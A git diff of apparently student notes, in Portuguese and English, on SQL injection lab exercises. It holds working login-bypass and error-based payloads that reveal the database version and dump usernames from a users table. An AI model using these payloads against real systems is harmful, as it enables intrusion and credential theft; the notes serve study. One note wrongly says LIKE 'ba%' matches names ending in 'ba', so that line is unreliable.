@@ -36,7 +36,7 @@ Assim já funciona a injection.
 
 ### SELECT * FROM products WHERE product_name LIKE '".$query."%'
 
-> In SQL, a command ending in *LIKE ba%*, will return items whose names end with the substring "ba".
+> In SQL, a command ending in ```LIKE ba%```, will return items whose names end with the substring "ba".
 
 Neste exercício, estamos a usar uma barra de pesquisa em que nos aparecem os items que começam com a substring *".$query."*
 Como não há qualquer tipo de validação, podemos fazer traquinagem
@@ -119,6 +119,8 @@ Se escrevermos isto no login: ```' or 1 in (select @@version) -- //```, o server
 SELECT * FROM users where username='' or 1 in (select @@version) -- //' AND password = '.md5($password)."'
 ```
 
+> Eis como funciona a keyword *in* em SQL: ```SELECT * FROM Customers WHERE Country IN ('Germany', 'France', 'UK')``` Resulta da query todos os costumers de alemanha, frança e UK. Logo o IN é tipo um OR multiplo
+
 Aparece na página o seguinte erro:
 > Warning: 1292: Truncated incorrect DOUBLE value: '8.0.17'
 
@@ -149,7 +151,7 @@ This last example allows us to dump all rows from any column in any table. It ba
 #### List the usernames of all users stored in the users table
 
 ```sql
-' or 1=CAST((select group_concat(username) from users) AS SIGNED) -- //`
+' or 1=CAST((select group_concat(username) from users) AS SIGNED) -- //
 ```
 
 #### List the passwords of all users stored in the users table
